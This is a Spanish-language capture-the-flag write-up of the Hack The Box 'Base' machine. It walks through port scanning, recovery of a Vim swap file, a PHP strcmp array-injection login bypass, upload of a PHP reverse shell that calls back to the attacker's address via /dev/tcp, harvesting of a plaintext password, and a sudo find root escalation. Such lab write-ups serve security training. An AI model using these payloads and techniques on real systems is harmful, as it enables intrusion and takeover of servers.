---
title: Writeup base - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - base
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina base en Hack The Box.
keywords:
  - writeup base
  - hack the box base
  - resolución máquina base
  - base hack the box
  - htb base
---
--------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/SuperFacil/Tier+2/Linux/Base)
- 📺 **Resolución en vivo (completa)**: [Link](https://www.youtube.com/watch?v=Trejh7Fih34)
- 🧠 **Explicación resumida**: [Link](https://www.youtube.com/watch?v=ZWIzmLDjlTo)

---

#veryeasy #linux #nmap #ping #arbitraryfileupload #whatweb #arrayinjection #cat #strings #burpsuite #tratamientotty #sudo-l #grep  #abusobinariofind 

-----
# Guided Mode

1)¿Qué dos puertos TCP están abiertos en el host remoto?
	22,80

2)¿Cuál es la ruta relativa en el servidor web para la página de inicio de sesión?
	/login/login.php

3)¿Cuántos ficheros hay en el directorio «/login»?
	3

4)¿Cuál es la extensión de un archivo swap?
	.swp
	
5)¿Qué función PHP se utiliza en el código backend para comparar el nombre de usuario y la contraseña enviados por el usuario con el nombre de usuario y la contraseña válidos?
	strcmp()

6)¿En qué directorio se almacenan los archivos cargados?
	\_uploaded

7)¿Qué usuario existe en el host remoto con un directorio home?
	john

8)¿Cuál es la contraseña del usuario presente en el sistema?
	thisisagoodpassword

9)¿Cuál es la ruta completa del comando que el usuario john puede ejecutar como usuario root en el host remoto?
	/usr/bin/find

10)¿Qué acción puede utilizar el comando find para ejecutar comandos?
	exec

-----
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.129.95.184
nmap -p- --open -vvv --min-rate 5000 -sS -n -Pn 10.129.95.184 -oG allPorts
extractPorts allPorts
nmap -sCV -p22,80 10.129.95.184 -oN target
```


![[Base1.png]]
![[Base2.png]]
*TTL:* Maquina linux
*Puertos:*
	`22`SSH
	`80`HTTP

--------
# [[Whatweb-wappalyzer]]

```shell
whatweb http://10.129.95.184/
```
![[Base3.png]]

![[Base21.png]]

Nos da el mail info@base.htb, asi que podria existir un dominio base.htb

-------
# [[Array Injection]]

Fui a la parte de login y me redirige a este link
![[Base22.png]]

![[Base7.png]]
Asi que vamos al directorio */login* para ver si encontramos algo y descargamos el archivo .swp que se encuentra en ese directorio
![[Base6.png]]
Ahora si cateamos el archivo nos va a aparecer que es un binario. Lo que vamos a hacer es abrirlo con ``nvim login.php.swp``

![[Base8.png]]
y vemos que tiene muchas cadenas que no se pueden leer
![[Base9.png]]
Asi que vamos a usar [[strings]] con el comando `strings login.php.swp > loginlimpio.txt` para sacar las cadenas legibles y el output lo voy a poner en un archivo que se llama loginlimpio.txt 
![[Base10.png]]
y ahora lo abrimos con [[cat]] usando el comando `cat loginlimpio.txt -l java` 
	Aclaracion: Si bien no es java el lenguaje, usa los colores bastante bien para separarlo y entender mejor el codigo
	
![[Base23.png]]

Despues de analizar el archivo, nos muetra que nos da que la sesion es valida con $\_SESSION antes de verificar si el usuario/contraseña es correcto, y que lo primero que hace es redirigir el usuario a upload.php sin importar si las credenciales son correctas o no
```
header("Location: /upload.php");
  72   │             $_SESSION['user_id'] = 1;
  73   │         if (strcmp($password, $_POST['password']) == 0) {
  74   │     if (strcmp($username, $_POST['username']) == 0) {
  75   │     require('config.php');
  76   │ if (!empty($_POST['username']) && !empty($_POST['password'])) {
  77   │ session_start();
```

Interceptamos con burpsuite la peticion

![[Base12.png]]
Y cambiamos la ultima linea por `username[]=test&password[]=pass` para romper la cambiar la peticion de un string a un array para romperla
Asi ganamos acceso a la pagina upload.php
![[Base13.png]]

----------
# [[Arbitrary file upload]]

Con el diccionario de seclists no vamos a encontrar nunca el directorio donde se suben los archivos que es http://10.129.95.184/_uploaded/ ya que la palabra uploaded no aparece en los diccionarios. Para poder encontrarla vamos a usar [[nvim]] y ponemos `nvim /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt` y agregamos en las primeas lineas *\_uploaded*

Vamos a usar [[Gobuster]] para enumerar directorios `gobuster dir -u http://10.129.95.184/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt --add-slash -t 60`
![[Base15.png]]

--------
### Sacamos una [[Reverse shell]] 
Creamos un archivo con nombre rever.php
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.21/443 0>&1'");
?>
```

Mientras estamos en escucha con [[nc -nlvp 443]], vamos a abrir el archivo desde http://10.129.95.184/_uploaded/rever.php
![[Base14.png]]
Y ya estamos adentro de la maquina

--------------
# [[Tratamiento de la TTY]]

-------
# Escalada al usuario john buscando [[Posibles archivos con contraseñas]]

Buscamos con [[grep]]`grep -riE "password|.*password|password.*" ` desde el directorio /var/www/html/login
Y encontramos la contraseña *thisisagoodpassword*
![[Base16.png]]
Y si vamos al directorio de *home* vemos que existe el usuario *john*

![[Base25.png]]
Asi que tenemos las credenciales:
	john:thisisagoodpassword
### Conexion por [[ssh]]
```shell
ssh john@10.129.95.184 -p 22
```
![[Base18.png]]
Ya tenemos primera flag de intrusion

------
# Escalada de privilegios a root con [[Abuso de Sudo]] del [[Binario find]]

Con `sudo -l` vemos que el binario /usr/bin/find se ejecuta como root
![[Base19.png]]


[Articulo de gtfobinds donde se saco este payload](https://gtfobins.github.io/gtfobins/find/#suid)
```
sudo /usr/bin/find . -exec /bin/bash -p \; -quit
```
![[Base20.png]]
Ya podemos catear las flags para terminar la maguina

----------
# Notas

Los archivos `.swp` los crea Vim para guardar cambios temporales mientras editás, permitiendo recuperar datos si se cierra inesperadamente. También evitan que se edite el mismo archivo desde dos lugares a la vez. Podés borrarlos si estás seguro de que Vim ya no está usando el archivo.


---------
# Creditos
Writeup oficial HackTheBox